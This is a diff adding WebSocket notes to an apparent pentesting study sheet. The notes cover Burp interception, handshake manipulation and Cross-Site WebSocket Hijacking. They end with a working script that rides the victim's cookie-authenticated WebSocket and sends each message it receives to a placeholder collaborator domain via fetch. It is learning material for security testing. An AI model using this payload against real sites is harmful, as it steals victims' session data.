@@ -177,3 +177,38 @@ Step 2: Build malicous page to exploits
         2. Right-click -> Engagement Tools -> Generate CSRF PoC
         3. Customize generated PoC as needed
         4. Host in AWS
+
+
+# WebSockets
+
+- WebSocket messages can be intercepted in Burp just like HTTP/HTTPS requests
+- Set Client-to-Server or Server-to-Client in the Options tab
+- Manipulate WebSocket handshake:
+    Why?
+        ~ Expand attack surface (most important)
+        ~ Attack may close your established connection
+        ~ Token expires
+    Step 1: Burp Repeater -> "Pencil Icon" next to the WebSocket URL
+    Step 2: Choose to clone or reconnect
+    Step 3: Edit connection as needed
+    Step 4: Click "Connect" to initiate handshake
+- Identify design flaws:
+    ~ Misplaced trust in HTTP security headers
+    ~ Flaws in session handling
+    ~ Expanded attack surface w/ custom HTTP headers
+- Cross-Site WebSocket Hijacking (CSWSH):
+    ~ Identify HTTP WebSocket handshake that does not have CSRF or other unpredictable token
+    ~ Session must be established through cookie, just like CSRF
+    ~ Sec-WebSocket-Key header DOES NOT perform authentication or session handling
+    ~ Malicious Application:
+        <script>
+            websocket = new WebSocket('wss://your-websocket-URL')
+            websocket.onopen = start
+            websocket.onmessage = handleReply
+            function start(event) {
+                websocket.send("READY");
+            }
+            function handleReply(event) {
+                fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
+            }
+        </script> 
